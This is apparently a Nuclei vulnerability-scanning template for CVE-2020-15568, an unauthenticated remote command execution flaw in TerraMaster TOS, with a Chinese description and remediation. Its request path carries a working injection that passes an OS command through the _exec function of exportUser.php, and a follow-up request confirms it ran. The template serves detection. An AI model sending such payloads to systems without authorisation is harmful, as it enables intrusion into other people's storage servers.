id: CVE-2020-15568
info:
  name: TerraMaster TOS <.1.29 - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    TerraMaster TOS远程命令执行漏洞
    Terramaster TOS是中国深圳市图美电子技术（Terramaster）公司的一款基于Linux平台的，专用于erraMaster云存储NAS服务器的操作系统。
    TerraMaster TOS 4.2.06及之前版本存在远程命令执行漏洞。未经身份认证的远程攻击者可通过Event参数中的/include/makecvs.php注入任意OS命令。
  severity: critical
  remediation: |-
    #### 官方修复方案：
    目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
    [https://www.terra-master.com/cn/](https://www.terra-master.com/cn/)
requests:
- matchers:
  - type: dsl
    dsl:
    - contains(body_2,verify) && status_code_1==200 && status_code_2==200 && !contains(body_1,"include/exportUser.php?type=3")
  matchers-condition: and
  path:
  - '{{BaseURL}}/include/exportUser.php?type=3&cla=application&func=_exec&opt=(echo%20{{verify}})%3E{{verify}}.txt'
  - '{{BaseURL}}/include/{{verify}}.txt'
  method: GET
variables:
  verify: '{{md5(rand_text_alphanumeric(8,""))}}'
